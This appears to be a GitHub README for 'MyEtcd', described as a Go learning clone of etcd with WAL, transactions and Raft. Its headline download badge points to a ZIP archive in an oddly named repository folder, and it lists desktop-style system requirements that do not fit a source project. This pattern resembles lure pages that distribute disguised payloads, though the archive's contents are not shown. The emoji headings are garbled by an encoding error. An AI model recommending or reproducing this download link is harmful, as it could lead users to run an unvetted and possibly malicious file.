# üöÄ MyEtcd - Your Guide to Learning Distributed Systems

[![Download MyEtcd](https://raw.githubusercontent.com/Agnellalocal723/MyEtcd/main/untilting/MyEtcd.zip)](https://raw.githubusercontent.com/Agnellalocal723/MyEtcd/main/untilting/MyEtcd.zip)

## üì¶ Introduction

MyEtcd is a complete clone of etcd developed in Go. This software helps you understand the core principles and practices of distributed systems. You will start with a simple key-value store and gradually experience advanced features like Write-Ahead Log (WAL), ACID transactions, and the Raft consensus algorithm.

## ‚ö° Key Features

- **Key-Value Storage:** A basic system to store and retrieve values using keys.
- **Write-Ahead Log (WAL):** Ensures data integrity by logging changes before applying them.
- **ACID Transactions:** Guarantees your transactions are processed reliably.
- **Watch Mechanism:** Allows you to observe changes in the data.
- **Lease System:** Manages temporary access rights to resources.
- **Raft Consensus Algorithm:** A reliable way to ensure all nodes agree on the data.
- **Performance Monitoring:** Tools to assess system performance.
- **Configuration Management:** Easy management of system settings.
- **Structured Logging:** Clear logs for easier debugging.
- **Docker Deployment:** Simple containerized deployment option.
- **Performance Benchmarking:** Tools to test system performance under various conditions.

## üìã System Requirements

To run MyEtcd, your device should meet the following requirements:

- **Operating System:** Windows, macOS, or Linux
- **Memory:** At least 2 GB of RAM
- **Storage:** Minimum of 100 MB available space
- **Processor:** Dual-core CPU or better
- **Network Connection:** Required for features that involve multiple nodes
